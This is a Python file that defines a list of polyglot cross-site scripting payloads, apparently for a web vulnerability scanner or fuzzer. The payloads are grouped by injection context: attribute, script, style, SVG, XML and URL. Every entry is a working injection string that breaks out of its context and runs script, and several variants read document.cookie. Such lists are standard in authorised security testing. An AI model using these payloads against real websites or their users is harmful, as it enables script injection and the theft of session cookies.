"""
Polyglot XSS payloads that can work in multiple contexts
"""

POLYGLOT_PAYLOADS = [
    # Basic polyglot payloads
    'javascript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e',
    'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert("XSS") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("XSS")//>\x3e',
    'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e',

    # Advanced polyglot payloads
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
    '">><marquee><img src=x onerror=confirm("XSS")></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt("XSS")><script>prompt("XSS")</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert("XSS")</script>"><img/id="confirm&lpar;\'XSS\')"/alt="/"src="/"onerror=eval(id)>\'">',
    '">><marquee><img src=x onerror=confirm(document.cookie)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(document.cookie)><script>prompt(document.cookie)</script>@gmail.com<isindex formaction=javascript:alert(document.cookie) type=submit>\'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;document.cookie)"/alt="/"src="/"onerror=eval(id)>\'">',

    # Context-breaking polyglot payloads
    '\'"`><script>/* *\x2Falert(1)// */</script>',
    '\'"`><script>/* *\x2Falert("XSS")// */</script>',
    '\'"`><script>/* *\x2Falert(document.cookie)// */</script>',

    # HTML5 polyglot payloads
    '<noscript><p title="</noscript><script>alert(1)</script>">',
    '<noscript><p title="</noscript><script>alert("XSS")</script>">',
    '<noscript><p title="</noscript><script>alert(document.cookie)</script>">',

    # SVG polyglot payloads
    '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert("XSS") /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(document.cookie) /><a id=xss><text x=20 y=20>XSS</text></a>',

    # XML polyglot payloads
    '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>',
    '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert("XSS")</script></html>',
    '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.cookie)</script></html>',

    # JSON polyglot payloads
    '</script><script>alert(1)</script>',
    '</script><script>alert("XSS")</script>',
    '</script><script>alert(document.cookie)</script>',

    # CSS polyglot payloads
    '</style><script>alert(1)</script>',
    '</style><script>alert("XSS")</script>',
    '</style><script>alert(document.cookie)</script>',

    # URL polyglot payloads
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("XSS")//\'>',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(document.cookie)//\'>',
]
